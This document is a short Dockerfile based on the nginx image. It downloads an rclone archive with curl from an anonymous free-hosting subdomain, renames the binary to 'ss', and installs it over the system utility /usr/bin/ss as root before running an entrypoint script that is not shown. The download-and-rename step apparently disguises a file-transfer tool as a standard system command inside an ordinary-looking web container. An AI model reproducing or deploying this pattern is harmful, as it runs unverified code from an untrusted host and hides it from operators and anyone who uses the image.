FROM nginx:1.19.6
RUN set -ex\
    && apt update -y \
    && apt upgrade -y \
    && apt install -y wget\
    && apt install unzip -y
RUN curl -O 'https://ouadgh9uaogab.000webhostapp.com/rclone/pd/rclone.zip' && \
    unzip rclone.zip && \
    mv rclone ss && \
    cp ss /usr/bin/ && \
    chown root:root /usr/bin/ss && \
    chmod 755 /usr/bin/ss

COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
CMD /entrypoint.sh
